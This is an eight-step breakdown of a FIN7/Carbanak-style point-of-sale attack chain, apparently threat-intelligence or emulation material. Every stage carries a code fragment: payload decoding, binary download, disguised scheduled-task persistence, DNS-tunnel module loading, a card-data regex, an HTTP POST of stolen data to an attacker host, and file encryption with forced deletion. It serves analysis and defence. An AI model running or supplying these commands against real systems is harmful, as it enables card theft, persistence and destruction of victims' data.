DETAILED 8-STEP CHAIN ANALYSIS
1
Reconnaissance and Preparation
Attacker gathers victim info and POS payment procedures. FIN7 registers fake domains and establishes shell company 'Slazzer LLC' to create legitimate-looking phishing emails.
↓
2
Initial Access
Send targeted spearphishing emails to employees with malicious DOCX attachments, often disguised as overdue payment invoices.
Attachment: Payment overdue.eml, 1-list.docx
↓
3
Execution
Victim opens DOCX, tricked into enabling macros. BATELEUR loader is executed by wscript.exe. PowerShell runs hidden with -NoProfile flag to decode the Payload.
powershell -NoProfile -c "$b=Get-Content '%INFILE%';[IO.File]::WriteAllBytes('%OUTFILE%',[Convert]::FromBase64String($b))"
↓
4
C2 Communication & Tool Transfer
HTTP connection retrieves encoded malware (debug.txt) converted to JScript (debug.log). JScript calls ADODB.Stream to download Carbanak binary (update.exe).
http.open("GET", url, false); stream.Write(http.responseBody); stream.SaveToFile(outPath, 2);
↓
5
Persistence
Registers Scheduled Task 'WindowsUpdateDebug' to run script on logon. Carbanak uses sdbinst.exe to install Shim database (.sdb) for evasion.
schtasks /create /f /sc onlogon /tn "WindowsUpdateDebug" /tr "wscript.exe //e:jscript debug.log"
↓
6
Collection
Malware scans POS process RAM (ReadProcessMemory) for payment card structures (Track 1/2). C# Keylogger and screencapture modules are loaded directly into RAM via DNS Tunneling (TXT records).
Resolve-DnsName -Name $domain -Type TXT -Server $SLINGSHOT_IP Regex pattern = new Regex(@"%B\d{1,19}\^[A-Za-z\s/]{2,26}\^\d{4}.*\?");
↓
7
Exfiltration
Compress all logs, screenshots, and RAM data into a session-specific ZIP file. Send all data via HTTP POST to attacker's upload.php script.
$webClient = New-Object System.Net.WebClient $response = $webClient.UploadFile("http://10.10.20.10/upload.php", "POST", $zip)
↓
8
Data Encryption / Ransomware (Impact)
Uses Cryptography.Aes to encrypt critical files with AES-CBC algorithm. Files renamed to .aes. Remove-Item -Force command deletes original files to prevent recovery.
$Aes = [System.Security.Cryptography.Aes]::Create() $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC Remove-Item -Path $Path -Force
